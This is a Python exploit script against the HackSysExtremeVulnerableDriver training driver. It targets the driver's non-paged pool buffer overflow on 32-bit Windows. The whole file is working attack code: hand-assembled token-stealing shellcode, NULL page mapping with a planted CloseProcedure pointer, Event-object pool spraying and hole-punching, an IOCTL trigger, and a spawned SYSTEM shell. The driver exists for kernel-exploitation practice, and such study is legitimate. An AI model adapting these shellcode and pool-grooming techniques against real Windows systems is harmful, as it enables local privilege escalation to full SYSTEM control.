import os
from helper import *
from ctypes import *

def ioctl(function, devicetype = 0x00000022, access = 0x00000000, method = 0x00000003):
	return ((devicetype << 16) | (access << 14) | (function << 2) | method)

def main():
	HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL = ioctl(0x803)

	lpFileName = "\\\\.\\HackSysExtremeVulnerableDriver"
	handle = get_handle(lpFileName)

	steal_token = (
		"\x60"                              # pushad
		"\x33\xc0"                          # xor   eax,eax
		"\x64\x8b\x80\x24\x01\x00\x00"      # mov   eax,DWORD PTR fs:[eax+0x124]
		"\x8b\x40\x50"                      # mov   eax,DWORD PTR [eax+0x50]
		"\x8b\xc8"                          # mov   ecx,eax
		"\x8b\x80\xb8\x00\x00\x00"          # mov   eax,DWORD PTR [eax+0xb8]
		"\x2d\xb8\x00\x00\x00"              # sub   eax,0xb8
		"\x83\xb8\xb4\x00\x00\x00\x04"      # cmp   DWORD PTR [eax+0xb4],0x4
		"\x75\xec"                          # jne   0xe
		"\x8b\x90\xf8\x00\x00\x00"          # mov   edx,DWORD PTR [eax+0xf8]
		"\x89\x91\xf8\x00\x00\x00"          # mov   DWORD PTR [ecx+0xf8],edx
		"\x61"                              # popad
		"\xc3"                              # retn
	)

	# Allocate 'shellcode' via VirtualAlloc()
	addr = alloc_memory_virtualalloc(0, len(steal_token), steal_token)
	shellcode_ptr = p32(addr)

	# Allocating/Mapping NULL page
	addr = alloc_null_page(0x1, 0x100)

	print("[+] Writing shellcode pointer to 0x00000060")
	# Alloc pointer to CloseProcedure: 0x28 (TypeInfo) + 0x38 (CloseProcedure) = 0x60
	tmp_ptr = create_string_buffer(shellcode_ptr, 0x60)
	memmove(0x60, addressof(tmp_ptr), 0x60)

	# Create a payload buffer with changed pool header event
	payload = "\x41" * 0x1f8
	payload += pool_header_event()
	payload_ptr = id(payload) + 20

	# Spraying the Non-Paged Pool with Event Objects
	object_handles = spray_event_objects(15000)

	# Creating holes in the sprayed region
	make_holes_sprayed_region(15000, object_handles)

	# Trigger the bug 
	trigger(handle, HEVD_IOCTL_BUFFER_OVERFLOW_NON_PAGED_POOL, payload_ptr, len(payload))

	# Free allocated memory
	free_all_alloc(15000, object_handles)

	print("[+] Spawn SYSTEM shell\n")
	os.system("cmd.exe")

if __name__ == "__main__":
	main()
